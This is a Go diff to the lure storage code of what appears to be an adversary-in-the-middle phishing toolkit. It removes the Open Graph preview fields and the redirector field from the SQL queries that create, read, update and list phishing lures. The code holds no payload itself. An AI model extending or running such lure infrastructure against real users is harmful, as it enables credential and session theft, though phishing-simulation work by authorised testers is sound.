@@ -17,12 +17,10 @@ func (s *Lures) CreateLure(l *aitm.Lure) error {
 	_, err := s.db.db.Exec(`
 		INSERT INTO lures
 			(id, phishlet, hostname, path, redirect_url, spoof_url,
-			 ua_filter, paused_until, og_title, og_desc, og_image, og_url,
-			 redirector, params_key)
-		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
+			 ua_filter, paused_until, params_key)
+		VALUES (?,?,?,?,?,?,?,?,?)`,
 		l.ID, l.Phishlet, l.Hostname, l.Path, l.RedirectURL,
-		l.SpoofURL, l.UAFilter, l.PausedUntil.Unix(),
-		l.OGTitle, l.OGDesc, l.OGImage, l.OGURL, l.Redirector, l.ParamsKey,
+		l.SpoofURL, l.UAFilter, l.PausedUntil.Unix(), l.ParamsKey,
 	)
 	if isConflict(err) {
 		return aitm.ErrConflict
@@ -33,8 +31,7 @@ func (s *Lures) CreateLure(l *aitm.Lure) error {
 func (s *Lures) GetLure(id string) (*aitm.Lure, error) {
 	row := s.db.db.QueryRow(`SELECT
 		id, phishlet, hostname, path, redirect_url, spoof_url,
-		ua_filter, paused_until, og_title, og_desc, og_image, og_url,
-		redirector, params_key FROM lures WHERE id = ?`, id)
+		ua_filter, paused_until, params_key FROM lures WHERE id = ?`, id)
 	l, err := scanLure(row)
 	if errors.Is(err, sql.ErrNoRows) {
 		return nil, aitm.ErrNotFound
@@ -46,12 +43,10 @@ func (s *Lures) UpdateLure(l *aitm.Lure) error {
 	res, err := s.db.db.Exec(`
 		UPDATE lures SET
 			phishlet=?, hostname=?, path=?, redirect_url=?,
-			spoof_url=?, ua_filter=?, paused_until=?, og_title=?, og_desc=?,
-			og_image=?, og_url=?, redirector=?, params_key=?
+			spoof_url=?, ua_filter=?, paused_until=?, params_key=?
 		WHERE id=?`,
 		l.Phishlet, l.Hostname, l.Path, l.RedirectURL,
-		l.SpoofURL, l.UAFilter, l.PausedUntil.Unix(),
-		l.OGTitle, l.OGDesc, l.OGImage, l.OGURL, l.Redirector, l.ParamsKey,
+		l.SpoofURL, l.UAFilter, l.PausedUntil.Unix(), l.ParamsKey,
 		l.ID,
 	)
 	if err != nil {
@@ -71,8 +66,7 @@ func (s *Lures) DeleteLure(id string) error {
 func (s *Lures) ListLures() ([]*aitm.Lure, error) {
 	rows, err := s.db.db.Query(`SELECT
 		id, phishlet, hostname, path, redirect_url, spoof_url,
-		ua_filter, paused_until, og_title, og_desc, og_image, og_url,
-		redirector, params_key FROM lures ORDER BY rowid ASC`)
+		ua_filter, paused_until, params_key FROM lures ORDER BY rowid ASC`)
 	if err != nil {
 		return nil, err
 	}
@@ -96,8 +90,7 @@ func scanLure(row scanner) (*aitm.Lure, error) {
 	)
 	err := row.Scan(
 		&l.ID, &l.Phishlet, &l.Hostname, &l.Path,
-		&l.RedirectURL, &l.SpoofURL, &l.UAFilter, &pausedUntil,
-		&l.OGTitle, &l.OGDesc, &l.OGImage, &l.OGURL, &l.Redirector, &l.ParamsKey,
+		&l.RedirectURL, &l.SpoofURL, &l.UAFilter, &pausedUntil, &l.ParamsKey,
 	)
 	if err != nil {
 		return nil, err
